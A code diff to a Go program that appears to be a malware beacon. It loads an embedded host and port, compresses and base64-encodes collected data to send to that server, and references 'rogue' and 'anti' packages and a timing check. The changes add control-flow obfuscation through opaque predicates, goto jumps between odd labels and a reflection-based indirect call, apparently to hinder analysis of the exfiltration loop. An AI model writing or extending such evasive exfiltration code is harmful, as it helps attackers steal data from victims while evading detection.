@@ -30,7 +30,7 @@ type unknown struct {
 }
 
 func BB176245(x int) bool {
-	return (x*x+2*x+1)%2 == 1 // This is always odd for x != -1
+	return (x % 2) == 1 // Returns true for 5 and false for 2
 }
 
 func BB23598623() bool {
@@ -85,7 +85,9 @@ startpoint:
 		rogue.FuncDF7858354()
 		goto XXSFDgs12
 	case false:
-		if BB176245(42) {
+		goto gabbagool
+	salami:
+		if BB176245(5) {
 			// Load configuration from embedded data
 			conf, err := shared.LoadConfig()
 			if err != nil {
@@ -94,7 +96,6 @@ startpoint:
 			}
 
 			maxRetries := 3
-
 			for {
 				baseUrl := ""
 				baseUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.GetPath
@@ -119,6 +120,7 @@ startpoint:
 				compedData, shouldComp := shared.DoComp(hardVals)
 				// anti.TimingCheck()
 				if shouldComp {
+
 					//fmt.Println(hardVals)
 					encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
 					// "da" can be changed to a randomly chosen string to cycle through
@@ -281,6 +283,19 @@ startpoint:
 					}
 				}
 			}
+		}
+	gabbagool:
+		switch BB23598623() {
+		case true:
+			BB176245(2)
+			goto startpoint
+		case false:
+			funcName := "X1A9T"
+			args := []b.Value{b.ValueOf(23498756213049576)}
+			b.ValueOf(map[string]interface{}{
+				"X1A9T": X1A9T,
+			}[funcName]).Call(args)
+			goto salami
 		}
 	}
 XXSFDgs12:
